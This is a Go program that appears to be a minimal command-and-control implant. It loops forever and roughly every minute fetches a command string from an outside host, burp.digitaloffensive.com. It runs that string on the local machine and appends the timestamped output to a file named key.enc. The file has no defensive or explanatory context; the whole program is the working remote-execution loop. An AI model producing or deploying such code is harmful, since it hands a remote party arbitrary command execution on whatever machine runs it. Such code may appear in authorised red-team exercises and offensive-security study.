package main

import (
        "fmt"
        "math/rand"
        "os/exec"
        "os"
        "io/ioutil"
        "net/http"
        "time"
        "strings"
)

func main() {
        rand.Seed(time.Now().UnixNano())

        for {
                // Generate a random sleep duration between 1 and x minutes
                sleepDuration := time.Duration(rand.Intn(1)+1) * time.Minute

                time.Sleep(sleepDuration)

                // Run the command
                exeCommand()
        }
}

func exeCommand() {
// Get the commands
    fileURL := "http://burp.digitaloffensive.com"
    response, err := http.Get(fileURL)
    if err != nil {
        fmt.Printf("Error downloading file: %v\n", err)
        return
    }
    defer response.Body.Close()
        
    fileBytes, err := ioutil.ReadAll(response.Body)
    if err != nil {
        fmt.Printf("Error reading file: %v\n", err)
        return
    }
        
    cmdContent := string(fileBytes)

// Uncomment to test what the command looks like
//    fmt.Println(cmdContent)

// To handle commands with space and args
        args := strings.Split(cmdContent, " ")

// Command Execution
        cmd := exec.Command(args[0], args[1:]...)
        output, err := cmd.Output()
        if err != nil {
                fmt.Printf("Error running command: %v\n", err)
                return
        }
//      fmt.Printf("Command output:\n%s\n", output)
        // Get the current date and time
        now := time.Now()
        // Open a file to write the output
        file, err := os.OpenFile("key.enc", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
        if err != nil {
                fmt.Printf("Error opening file: %v\n", err)
                return
        }
        defer file.Close()

        // Write the date and time to the file
        _, err = fmt.Fprintf(file, "\n\n--- Command ran at %s ---\n", now.Format("2006-01-02 15:04:05"))
        if err != nil {
                fmt.Printf("Error writing to file: %v\n", err)
                return
        }

        // Write the output to the file
        _, err = file.Write(output)
        if err != nil {
                fmt.Printf("Error writing to file: %v\n", err)
                return
        }
}
